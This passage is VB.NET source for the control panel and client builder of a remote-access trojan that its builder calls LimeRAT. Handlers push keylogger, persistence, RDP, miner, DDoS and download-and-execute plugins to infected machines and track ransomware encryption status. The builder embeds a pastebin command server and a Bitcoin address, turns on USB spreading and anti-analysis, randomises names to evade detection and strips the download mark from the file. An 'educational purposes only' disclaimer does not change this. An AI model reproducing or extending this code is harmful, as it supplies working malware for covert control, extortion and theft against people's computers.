                            x.BackColor = Color.DarkSlateGray
                            CL.Send(M.ToArray)
                        ElseIf miner.K = True Then
                            x.BackColor = Color.DarkSlateGray
                            CL.Send(MM.ToArray)
                        End If
                    End If
                Next

                Try
                    Await M.FlushAsync
                    Await MM.FlushAsync
                    M.Dispose()
                    MM.Dispose()
                Catch ex As Exception
                End Try
            End If

        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Critical)
            Exit Sub
        End Try
    End Sub

    Private Sub DDoSToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DDoSToolStripMenuItem.Click
        Floods.Show()
    End Sub

    Private Async Sub EnableWindowsRDPToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles EnableWindowsRDPToolStripMenuItem.Click
        Try
            'Messages("Enable Remote Desktop", "Client must be running as Admin and using router that support UPNP")
            If L1.Items.Count > 0 Then
                Dim M As New IO.MemoryStream
                Dim CMD As Byte() = SB(S_Encryption.AES_Encrypt("IPLM" + SPL + Convert.ToBase64String(Await GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\WRDP.dll"), True)) + SPL + " "))
                Await M.WriteAsync(CMD, 0, CMD.Length)
                Await M.WriteAsync(SB(S_Settings.EOF), 0, S_Settings.EOF.Length)

                For Each x As ListViewItem In L1.SelectedItems
                    Dim CL As S_Client = CType(x.Tag, S_Client)
                    If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
                        x.BackColor = Color.DarkSlateGray
                        CL.Send(M.ToArray)
                    End If
                Next

                Try
                    Await M.FlushAsync
                    M.Dispose()
                Catch ex As Exception
                End Try
            End If
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Critical)
            Exit Sub
        End Try
    End Sub

#End Region

#Region "PC Options"
    Private Async Sub PCRestartToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PCRestartToolStripMenuItem.Click
        Try
            If L1.Items.Count > 0 Then
                Dim M As New IO.MemoryStream
                Dim CMD As Byte() = SB(S_Encryption.AES_Encrypt("IPLM" + SPL + Convert.ToBase64String(Await GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\MISC.dll"), True)) + SPL + "PC|'P'|1"))
                Await M.WriteAsync(CMD, 0, CMD.Length)
                Await M.WriteAsync(SB(S_Settings.EOF), 0, S_Settings.EOF.Length)

                For Each x As ListViewItem In L1.SelectedItems
                    If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
                        Dim CL As S_Client = CType(x.Tag, S_Client)
                        CL.Send(M.ToArray)
                        x.BackColor = Color.DarkSlateGray
                    End If
                Next

                Try
                    Await M.FlushAsync
                    M.Dispose()
                Catch ex As Exception
                End Try
            End If
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Critical)
            Exit Sub
        End Try
    End Sub

    Private Async Sub PCShutdownToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PCShutdownToolStripMenuItem.Click
        Try
            If L1.Items.Count > 0 Then
                Dim M As New IO.MemoryStream
                Dim CMD As Byte() = SB(S_Encryption.AES_Encrypt("IPLM" + SPL + Convert.ToBase64String(Await GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\MISC.dll"), True)) + SPL + "PC|'P'|2"))
                Await M.WriteAsync(CMD, 0, CMD.Length)
                Await M.WriteAsync(SB(S_Settings.EOF), 0, S_Settings.EOF.Length)

                For Each x As ListViewItem In L1.SelectedItems
                    If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
                        Dim CL As S_Client = CType(x.Tag, S_Client)
                        CL.Send(M.ToArray)
                        x.BackColor = Color.DarkSlateGray
                    End If
                Next

                Try
                    Await M.FlushAsync
                    M.Dispose()
                Catch ex As Exception
                End Try
            End If
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Critical)
            Exit Sub
        End Try
    End Sub

    Private Async Sub PCLogoutToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PCLogoutToolStripMenuItem.Click
        Try
            If L1.Items.Count > 0 Then
                Dim M As New IO.MemoryStream
                Dim CMD As Byte() = SB(S_Encryption.AES_Encrypt("IPLM" + SPL + Convert.ToBase64String(Await GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\MISC.dll"), True)) + SPL + "PC|'P'|3"))
                Await M.WriteAsync(CMD, 0, CMD.Length)
                Await M.WriteAsync(SB(S_Settings.EOF), 0, S_Settings.EOF.Length)

                For Each x As ListViewItem In L1.SelectedItems
                    If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
                        Dim CL As S_Client = CType(x.Tag, S_Client)
                        CL.Send(M.ToArray)
                        x.BackColor = Color.DarkSlateGray
                    End If
                Next

                Try
                    Await M.FlushAsync
                    M.Dispose()
                Catch ex As Exception
                End Try
            End If
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Critical)
            Exit Sub
        End Try
    End Sub


#End Region

#Region "Client Options"
    Private Async Sub UpdateDiskToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UpdateDiskToolStripMenuItem.Click
        Try
            If L1.Items.Count > 0 Then
                Dim o As New OpenFileDialog
                With o
                    .Filter = ".exe (*.exe)|*.exe"
                    .Title = "UPDATE"
                End With

                If o.ShowDialog = Windows.Forms.DialogResult.OK Then
                    Dim PLG = Convert.ToBase64String(Await GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\MISC.dll"), True))
                    Dim F = Convert.ToBase64String(Await GZip(IO.File.ReadAllBytes(o.FileName), True))
                    Dim CMD As Byte() = SB(S_Encryption.AES_Encrypt("IPLM" + SPL + Convert.ToBase64String(Await GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\PCL.dll"), True)) + SPL + "CL-" + "|'P'|" + "4" + "|'P'|" + IO.Path.GetFileName(o.FileName) + "|'P'|" + F))
                    Dim M As New IO.MemoryStream
                    Await M.WriteAsync(CMD, 0, CMD.Length)
                    Await M.WriteAsync(SB(S_Settings.EOF), 0, S_Settings.EOF.Length)

                    For Each x As ListViewItem In L1.SelectedItems
                        If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
                            Dim CL As S_Client = CType(x.Tag, S_Client)
                            x.BackColor = Color.DarkSlateGray
                            CL.Send(M.ToArray)
                        End If
                    Next

                    Try
                        Await M.FlushAsync
                        M.Dispose()
                    Catch ex As Exception
                    End Try
                End If
            End If
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Critical)
            Exit Sub
        End Try
    End Sub

    Private Async Sub UpdateFromURLToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UpdateFromURLToolStripMenuItem.Click
        Try
            If L1.Items.Count > 0 Then
                Dim URL As String = InputBox("Enter the direct link", "UPDATE", "http://site.com/file.exe")
                Dim EXE As String = InputBox("Enter the file name", "File Name", "Skype.exe")
                Dim M As New IO.MemoryStream

                If String.IsNullOrEmpty(URL) Then
                    Exit Sub
                Else

                    Dim CMD As Byte() = SB(S_Encryption.AES_Encrypt("IPLM" + SPL + Convert.ToBase64String(Await GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\PCL.dll"), True)) + SPL + "CL-" + "|'P'|" + "5" + "|'P'|" + URL + "|'P'|" + EXE))
                    Await M.WriteAsync(CMD, 0, CMD.Length)
                    Await M.WriteAsync(SB(S_Settings.EOF), 0, S_Settings.EOF.Length)

                    For Each x As ListViewItem In L1.SelectedItems
                        Dim CL As S_Client = CType(x.Tag, S_Client)
                        If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
                            x.BackColor = Color.DarkSlateGray
                            CL.Send(M.ToArray)
                        End If
                    Next
                End If

                Try
                    Await M.FlushAsync
                    M.Dispose()
                Catch ex As Exception
                End Try
            End If
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Critical)
            Exit Sub
        End Try
    End Sub

    Private Async Sub RestartToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RestartToolStripMenuItem.Click
        Try
            If L1.Items.Count > 0 Then
                Dim M As New IO.MemoryStream
                Dim CMD As Byte() = SB(S_Encryption.AES_Encrypt("IPLM" + SPL + Convert.ToBase64String(Await GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\PCL.dll"), True)) + SPL + "CL-|'P'|2"))
                Await M.WriteAsync(CMD, 0, CMD.Length)
                Await M.WriteAsync(SB(S_Settings.EOF), 0, S_Settings.EOF.Length)

                For Each x As ListViewItem In L1.SelectedItems
                    If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
                        Dim CL As S_Client = CType(x.Tag, S_Client)
                        x.BackColor = Color.DarkSlateGray
                        CL.Send(M.ToArray)
                    End If
                Next

                Try
                    Await M.FlushAsync
                    M.Dispose()
                Catch ex As Exception
                End Try
            End If

        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Critical)
            Exit Sub
        End Try
    End Sub

    Private Async Sub CloseToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CloseToolStripMenuItem.Click
        Try
            If L1.Items.Count > 0 Then
                Dim M As New IO.MemoryStream
                Dim CMD As Byte() = SB(S_Encryption.AES_Encrypt("IPLM" + SPL + Convert.ToBase64String(Await GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\PCL.dll"), True)) + SPL + "CL-|'P'|1"))
                Await M.WriteAsync(CMD, 0, CMD.Length)
                Await M.WriteAsync(SB(S_Settings.EOF), 0, S_Settings.EOF.Length)

                For Each x As ListViewItem In L1.SelectedItems
                    If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
                        Dim CL As S_Client = CType(x.Tag, S_Client)
                        x.BackColor = Color.DarkSlateGray
                        CL.Send(M.ToArray)
                    End If
                Next

                Try
                    Await M.FlushAsync
                    M.Dispose()
                Catch ex As Exception
                End Try

            End If
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Critical)
            Exit Sub
        End Try
    End Sub

    Private Async Sub UninstallToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UninstallToolStripMenuItem.Click
        Try
            If L1.Items.Count > 0 Then
                Dim result As DialogResult
                Dim M As New IO.MemoryStream
                Dim CMD As Byte() = SB(S_Encryption.AES_Encrypt("IPLM" + SPL + Convert.ToBase64String(Await GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\PCL.dll"), True)) + SPL + "CL-|'P'|3"))
                Await M.WriteAsync(CMD, 0, CMD.Length)
                Await M.WriteAsync(SB(S_Settings.EOF), 0, S_Settings.EOF.Length)

                For Each x As ListViewItem In L1.SelectedItems
                    Dim CL As S_Client = CType(x.Tag, S_Client)
                    If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
                        If x.SubItems(RANS.Index).Text = "Encryption in progress..." OrElse x.SubItems(RANS.Index).Text = "Decryption in progress..." OrElse x.SubItems(RANS.Index).Text = "Encrypted" Then
                            result = MessageBox.Show("Client didn't finish decrypting yet.." & vbNewLine & vbNewLine & "This might corrupt all files, Do you still want to countine? ", "", MessageBoxButtons.YesNo)
                            If result = DialogResult.Yes Then
                                x.BackColor = Color.DarkSlateGray
                                CL.Send(M.ToArray)
                            End If
                        Else
                            x.BackColor = Color.DarkSlateGray
                            CL.Send(M.ToArray)
                        End If
                    End If
                Next

                Try
                    Await M.FlushAsync
                    M.Dispose()
                Catch ex As Exception
                End Try
            End If
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Critical)
            Exit Sub
        End Try

    End Sub

#End Region

#Region "Others"

    Private Async Sub PersistenceToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PersistenceToolStripMenuItem.Click
        Try
            If L1.Items.Count > 0 Then
                Dim M As New IO.MemoryStream
                Dim CMD As Byte() = SB(S_Encryption.AES_Encrypt("IPLM" + SPL + Convert.ToBase64String(Await GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\PERS.dll"), True)) + SPL + " "))
                Await M.WriteAsync(CMD, 0, CMD.Length)
                Await M.WriteAsync(SB(S_Settings.EOF), 0, S_Settings.EOF.Length)

                For Each x As ListViewItem In L1.SelectedItems
                    If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
                        Dim CL As S_Client = CType(x.Tag, S_Client)
                        x.BackColor = Color.DarkSlateGray
                        CL.Send(M.ToArray)
                    End If
                Next

                Try
                    Await M.FlushAsync
                    M.Dispose()
                Catch ex As Exception
                End Try
            End If
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Critical)
            Exit Sub
        End Try
    End Sub

    Private Async Sub KeyloggerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles KeyloggerToolStripMenuItem.Click
        Try
            If L1.Items.Count > 0 Then
                Dim M As New IO.MemoryStream
                Dim CMD As Byte() = SB(S_Encryption.AES_Encrypt("IPLM" + SPL + Convert.ToBase64String(Await GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\KLG.dll"), True)) + SPL + " "))
                Await M.WriteAsync(CMD, 0, CMD.Length)
                Await M.WriteAsync(SB(S_Settings.EOF), 0, S_Settings.EOF.Length)

                For Each x As ListViewItem In L1.SelectedItems
                    Dim KL As Keylogger = My.Application.OpenForms("KL" + x.SubItems(ID.Index).Text)
                    If KL Is Nothing AndAlso Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
                        Dim CL As S_Client = CType(x.Tag, S_Client)
                        x.BackColor = Color.DarkSlateGray
                        CL.Send(M.ToArray)
                    End If
                Next

                Try
                    Await M.FlushAsync
                    M.Dispose()
                Catch ex As Exception
                End Try
            End If
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Critical)
            Exit Sub
        End Try
    End Sub

    Private Async Sub FromDiskToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles FromDiskToolStripMenuItem.Click
        Try
            If L1.Items.Count > 0 Then
                Dim o As New OpenFileDialog
                With o
                    .Title = "RUN"
                End With

                If o.ShowDialog = Windows.Forms.DialogResult.OK Then
                    Dim PLG = Convert.ToBase64String(Await GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\MISC.dll"), True))
                    Dim F = Convert.ToBase64String(Await GZip(IO.File.ReadAllBytes(o.FileName), True))
                    Dim CMD As Byte() = SB(S_Encryption.AES_Encrypt(("IPLM" + SPL + PLG + SPL + "RD-|'P'|" + IO.Path.GetFileName(o.FileName) + "|'P'|" + F)))
                    Dim M As New IO.MemoryStream
                    Await M.WriteAsync(CMD, 0, CMD.Length)
                    Await M.WriteAsync(SB(S_Settings.EOF), 0, S_Settings.EOF.Length)

                    For Each x As ListViewItem In L1.SelectedItems
                        If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
                            Dim CL As S_Client = CType(x.Tag, S_Client)
                            x.BackColor = Color.DarkSlateGray
                            CL.Send(M.ToArray)
                        End If
                    Next

                    Try
                        Await M.FlushAsync
                        M.Dispose()
                    Catch ex As Exception
                    End Try
                End If
            End If
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Critical)
            Exit Sub
        End Try
    End Sub

    Private Async Sub FromURLToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles FromURLToolStripMenuItem1.Click
        Try
            If L1.Items.Count > 0 Then
                Dim URL As String = InputBox("Enter the direct link", "Run File", "http: //site.com/file.exe")
                Dim EXE As String = InputBox("Enter the file name", "File Name", "Skype.exe")

                If String.IsNullOrEmpty(URL) Then
                    Exit Sub
                Else
                    Dim M As New IO.MemoryStream
                    Dim CMD As Byte() = SB(S_Encryption.AES_Encrypt("IPLM" + SPL + Convert.ToBase64String(Await GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\MISC.dll"), True)) + SPL + "RU-|'P'|" + URL.ToString + "|'P'|" + EXE.ToString))
                    Await M.WriteAsync(CMD, 0, CMD.Length)
                    Await M.WriteAsync(SB(S_Settings.EOF), 0, S_Settings.EOF.Length)

                    For Each x As ListViewItem In L1.SelectedItems
                        If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
                            Dim CL As S_Client = CType(x.Tag, S_Client)
                            x.BackColor = Color.DarkSlateGray
                            CL.Send(M.ToArray)
                        End If
                    Next

                    Try
                        Await M.FlushAsync
                        M.Dispose()
                    Catch ex As Exception
                    End Try
                End If
            End If

        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Critical)
            Exit Sub
        End Try
    End Sub

    Private Async Sub VisitWebsiteToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles VisitWebsiteToolStripMenuItem.Click
        Try
            If L1.Items.Count > 0 Then
                Dim URL As String = InputBox("Enter URL", "Visit URL", "http://google.com")

                If String.IsNullOrEmpty(URL) Then
                    Exit Sub
                Else
                    Dim M As New IO.MemoryStream
                    Dim CMD As Byte() = SB(S_Encryption.AES_Encrypt("IPLM" + SPL + Convert.ToBase64String(Await GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\MISC.dll"), True)) + SPL + "Visit|'P'|" + URL))
                    Await M.WriteAsync(CMD, 0, CMD.Length)
                    Await M.WriteAsync(SB(S_Settings.EOF), 0, S_Settings.EOF.Length)

                    If Not URL.StartsWith("http") Then
                        URL = "http://" + URL
                    End If
                    For Each x As ListViewItem In L1.SelectedItems
                        If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
                            Dim CL As S_Client = CType(x.Tag, S_Client)
                            x.BackColor = Color.DarkSlateGray
                            CL.Send(M.ToArray)
                        End If
                    Next

                    Try
                        Await M.FlushAsync
                        M.Dispose()
                    Catch ex As Exception
                    End Try
                End If
            End If
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Critical)
            Exit Sub
        End Try
    End Sub

    Private Async Sub RunAsAdministratorToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RunAsAdministratorToolStripMenuItem.Click
        Try
            If L1.Items.Count > 0 Then
                Dim M As New IO.MemoryStream
                Dim CMD As Byte() = SB(S_Encryption.AES_Encrypt("IPLM" + SPL + Convert.ToBase64String(Await GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\MISC.dll"), True)) + SPL + "PRI|'P'|"))
                Await M.WriteAsync(CMD, 0, CMD.Length)
                Await M.WriteAsync(SB(S_Settings.EOF), 0, S_Settings.EOF.Length)

                For Each x As ListViewItem In L1.SelectedItems
                    If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
                        Dim CL As S_Client = CType(x.Tag, S_Client)
                        x.BackColor = Color.DarkSlateGray
                        CL.Send(M.ToArray)
                    End If
                Next

                Try
                    Await M.FlushAsync
                    M.Dispose()
                Catch ex As Exception
                End Try
            End If
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Critical)
            Exit Sub
        End Try
    End Sub

    Private Sub AboutToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles AboutToolStripMenuItem.Click
        About.Show()
    End Sub

    Private Sub ClientNoteToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ClientNoteToolStripMenuItem.Click
        On Error Resume Next
        Dim note As String = InputBox("Enter note", "", "")
        For Each x As ListViewItem In L1.SelectedItems
            STV(x.SubItems(ID.Index).Text + "_" + x.SubItems(USERN.Index).Text + " Note", note)
            x.SubItems(NOTE_.Index).Text = note
        Next
    End Sub

    Private Sub ClientColorToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles ClientColorToolStripMenuItem1.Click
        On Error Resume Next

        Dim cDialog As New ColorDialog
        For Each x As ListViewItem In L1.SelectedItems
            If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
                If (cDialog.ShowDialog() = DialogResult.OK) Then
                    x.ForeColor = cDialog.Color
                    Dim CCC = ColorTranslator.ToHtml(cDialog.Color)
                    STV(x.SubItems(ID.Index).Text + "_" + x.SubItems(USERN.Index).Text + " Color", CCC)
                Else
                    DLV(x.SubItems(ID.Index).Text + "_" + x.SubItems(USERN.Index).Text + " Color")
                    x.ForeColor = Color.FromArgb(142, 188, 0)
                End If
            End If
        Next
    End Sub

    Private Sub ClientFolderToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles ClientFolderToolStripMenuItem1.Click
        On Error Resume Next
        For Each x As ListViewItem In L1.SelectedItems
            Process.Start(uFolder(x.SubItems(USERN.Index).Text + "_" + x.SubItems(ID.Index).Text, ""))
        Next
    End Sub

    Private Sub RemoveOfflineToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RemoveOfflineToolStripMenuItem.Click
        On Error Resume Next
        For Each x As ListViewItem In L1.Items
            If x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
                x.Remove()
            End If
        Next

        IO.File.Delete("Misc/USERS.xml")
    End Sub


#End Region

#Region "OnConnect"

    Private Sub OnConnectToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles OnConnectToolStripMenuItem.Click
        OnConnect.Show()
    End Sub

    Public ClientEXE As String
    Private Async Sub Timer3_Tick(sender As Object, e As EventArgs) Handles AutoUpdate.Tick
        Try
            If L1.Items.Count > 0 Then
                Dim M As New IO.MemoryStream
                Dim CMD As Byte() = SB(S_Encryption.AES_Encrypt("IPLM" + SPL + Convert.ToBase64String(Await GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\PCL.dll"), True)) + SPL + "CL-" + "|'P'|" + "4" + "|'P'|" + IO.Path.GetFileName(ClientEXE) + "|'P'|" + Convert.ToBase64String(Await GZip(IO.File.ReadAllBytes(ClientEXE), True))))
                Await M.WriteAsync(CMD, 0, CMD.Length)
                Await M.WriteAsync(SB(S_Settings.EOF), 0, S_Settings.EOF.Length)

                For Each x As ListViewItem In L1.Items
                    If x.SubItems(VER.Index).Text <> S_Settings.StubVer AndAlso Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
                        Dim CL As S_Client = CType(x.Tag, S_Client)
                        x.BackColor = Color.DarkSlateGray
                        CL.Send(M.ToArray)
                        S_Messages.Messages(x.SubItems(IP.Index).Text, "Updated to [" + S_Settings.StubVer + "] using Auto-Update")
                    End If
                Next


                Try
                    Await M.FlushAsync
                    M.Dispose()
                Catch ex As Exception
                End Try
            End If
        Catch ex As Exception
        End Try
    End Sub

    'Ping all clients
    Private Async Sub Timer2_Tick(sender As Object, e As EventArgs) Handles PingClients.Tick
        Try
            If L1.Items.Count > 0 Then
                Dim M As New IO.MemoryStream
                Dim CMD As Byte() = SB(S_Encryption.AES_Encrypt("!PSend"))
                Await M.WriteAsync(CMD, 0, CMD.Length)
                Await M.WriteAsync(SB(S_Settings.EOF), 0, S_Settings.EOF.Length)

                For Each x In S_Settings.Online.ToList
                    Dim CL As S_Client = CType(x, S_Client)
                    If Not CL.L.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
                        CL.Send(M.ToArray)
                    End If
                Next

                Try
                    Await M.FlushAsync
                    M.Dispose()
                Catch ex As Exception
                End Try
            End If
        Catch : End Try
    End Sub

#End Region

#End Region



#Region "Builder"

    Private Sub MetroButton1_Click(sender As Object, e As EventArgs) Handles MetroButton1.Click
        Try
            Dim result As DialogResult
            result = MessageBox.Show("I, the creator, am not responsible for any actions, and or damages, caused by this software. " & vbNewLine & vbNewLine & "You bear the full responsibility of your actions and acknowledge that this software was created for educational purposes only." & vbNewLine & vbNewLine & "This software's main purpose is NOT to be used maliciously, or on any system that you do not own, or have the right to use." & vbNewLine & vbNewLine & "By pressing ""YES"" button, you automatically agree to the above.", "Lime Worm | Disclaimer" & vbNewLine & vbNewLine, MessageBoxButtons.YesNo)
            If result = DialogResult.No Then
                Return
            ElseIf result = DialogResult.Yes Then

                If Not IO.File.Exists(Application.StartupPath & "\Misc\Stub\Stub.il") Then
                    MsgBox("Stub Not Found", MsgBoxStyle.Critical, Nothing)
                    Return
                End If

                If radioNET2.Checked Then
                    If IO.File.Exists("C:\Windows\Microsoft.NET\Framework\v2.0.50727\ilasm.exe") Then
                        Dim process As New Process()
                        process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden
                        process.StartInfo.FileName = "cmd.exe"
                        process.StartInfo.UseShellExecute = True
                        process.StartInfo.CreateNoWindow = True
                        process.StartInfo.Arguments = "/C C:\Windows\Microsoft.NET\Framework\v2.0.50727\ilasm.exe """ & Application.StartupPath + "\Misc\Stub\Stub.il""" & " /out=""" & Application.StartupPath + "\Misc\Stub\Stub.exe""" & ""
                        process.Start()
                        process.WaitForExit()
                    Else
                        MsgBox("Framework 2.0 is not installed!", MsgBoxStyle.Critical)
                        Return
                    End If
                Else
                    If IO.File.Exists("C:\Windows\Microsoft.NET\Framework\v4.0.30319\ilasm.exe") Then
                        Dim process As New Process()
                        process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden
                        process.StartInfo.FileName = "cmd.exe"
                        process.StartInfo.UseShellExecute = True
                        process.StartInfo.CreateNoWindow = True
                        process.StartInfo.Arguments = "/C C:\Windows\Microsoft.NET\Framework\v4.0.30319\ilasm.exe """ & Application.StartupPath + "\Misc\Stub\Stub.il""" & " /out=""" & Application.StartupPath + "\Misc\Stub\Stub.exe""" & ""
                        process.Start()
                        process.WaitForExit()
                    Else
                        MsgBox("Framework 4.0 is not installed!", MsgBoxStyle.Critical)
                        Return
                    End If
                End If

                If _exe.Text = "" Then
                    _exe.Text = "Wservices.exe"
                End If

                If _path1.Text = "" Then
                    _path1.Text = "Temp"
                End If

                If Not _exe.Text.EndsWith(".exe") Then
                    _exe.Text = _exe.Text + ".exe"
                End If

                If Not _path2.Text.StartsWith("\") Then
                    _path2.Text = "\" + _path2.Text
                End If
                If Not _path2.Text.EndsWith("\") Then
                    _path2.Text = _path2.Text + "\"
                End If

                If Not IO.File.Exists(Application.StartupPath & "\Misc\Stub\Stub.exe") Then
                    MsgBox("Stub Not Found", MsgBoxStyle.Critical, Nothing)
                    Return
                ElseIf _pastebin.Text = "" Or Not _pastebin.Text.Contains("http") Then
                    MsgBox("Enter pastebin raw url", MsgBoxStyle.Critical, Nothing)
                    Return
                Else

                    Dim definition As AssemblyDefinition = AssemblyDefinition.ReadAssembly(Application.StartupPath & "\Misc\Stub\Stub.exe")
                    If chkRename.Checked Then
                        definition.Name = New AssemblyNameDefinition(Randomi(rand.Next(6, 20)), New Version(rand.Next(0, 10), rand.Next(0, 10), rand.Next(0, 10), rand.Next(0, 10)))
                        definition.CustomAttributes.Clear()
                    End If
                    Dim definition2 As ModuleDefinition
                    For Each definition2 In definition.Modules
                        If chkRename.Checked Then
                            definition2.Name = Randomi(rand.Next(5, 15))
                        End If
                        Dim definition3 As TypeDefinition
                        For Each definition3 In definition2.Types
                            If chkRename.Checked Then
                                If definition3.Namespace = "Client.Lime" Then
                                    definition3.Namespace = Randomi(rand.Next(5, 15))
                                    definition3.Name = Randomi(rand.Next(5, 15))
                                End If
                                For Each F In definition3.Fields
                                    F.Name = Randomi(rand.Next(5, 15))
                                Next
                            End If
                            Dim definition4 As MethodDefinition
                            For Each definition4 In definition3.Methods
                                If Not definition4.IsConstructor AndAlso Not definition4.IsRuntimeSpecialName Then
                                    If chkRename.Checked Then
                                        definition4.Name = Randomi(rand.Next(5, 15))
                                        For Each P As ParameterDefinition In definition4.Parameters
                                            P.Name = Randomi(rand.Next(5, 15))
                                        Next
                                    End If
                                ElseIf (definition4.IsConstructor AndAlso definition4.HasBody) Then
                                    Dim enumerator As IEnumerator(Of Instruction)
                                    Try
                                        enumerator = definition4.Body.Instructions.GetEnumerator
                                        Do While enumerator.MoveNext
                                            Dim current As Instruction = enumerator.Current
                                            If ((current.OpCode.Code = Code.Ldstr) And (Not current.Operand Is Nothing)) Then
                                                Dim str As String = current.Operand.ToString
                                                If (str = "%Delay%") Then
                                                    current.Operand = _numDelay.Value.ToString
                                                End If
                                                If (str = "%Pastebin%") Then
                                                    current.Operand = S_Encryption.AES_Encrypt(_pastebin.Text)
                                                End If
                                                If (str = "%EXE%") Then
                                                    current.Operand = _exe.Text
                                                End If
                                                If (str = "%SPL%") Then
                                                    current.Operand = S_Settings.SPL
                                                End If
                                                If (str = "%KEY%") Then
                                                    current.Operand = S_Settings.EOF
                                                End If
                                                If (str = "%PASS%") Then
                                                    current.Operand = S_Settings.EncryptionKey
                                                End If
                                                If (str = "%DROP%") Then
                                                    current.Operand = _drop.Checked.ToString
                                                End If
                                                If (str = "%PATH1%") Then
                                                    current.Operand = _path1.Text
                                                End If
                                                If (str = "%PATH2%") Then
                                                    current.Operand = _path2.Text
                                                End If
                                                If (str = "%BTC_ADDR%") Then
                                                    current.Operand = _btc.Text
                                                End If
                                                If (str = "%USB%") Then
                                                    current.Operand = _usb.Checked.ToString
                                                End If
                                                If (str = "%PIN%") Then
                                                    current.Operand = _pin.Checked.ToString
                                                End If
                                                If (str = "%ANTI%") Then
                                                    current.Operand = _anti.Checked.ToString
                                                End If
                                                If (str = "%DWN_CHK%") Then
                                                    current.Operand = _dwnchk.Checked.ToString
                                                End If
                                                If (str = "%DWN_LINK%") Then
                                                    current.Operand = _dwnlink.Text
                                                End If
                                            End If
                                        Loop
                                    Finally
                                    End Try

                                End If
                            Next
                        Next
                    Next

                    Dim o As New SaveFileDialog With {
            .Filter = ".exe (*.exe)|*.exe",
            .InitialDirectory = Application.StartupPath,
            .Title = "LimeRAT Builder",
            .OverwritePrompt = False,
            .FileName = "New-Client"
                    }
                    If o.ShowDialog = Windows.Forms.DialogResult.OK Then
                        definition.Write(o.FileName)
                        If _icon.Checked = True AndAlso PictureBox1.ImageLocation <> "" Then
                            S_IconChanger.InjectIcon(o.FileName, PictureBox1.ImageLocation)
                        End If
                        Try : DeleteZoneIdentifier(o.FileName) : Catch : End Try
                        MsgBox("Your Client Has been Created Successfully", MsgBoxStyle.Information, "DONE!")
                        My.Settings.Save()
                    End If

                    definition.Dispose()
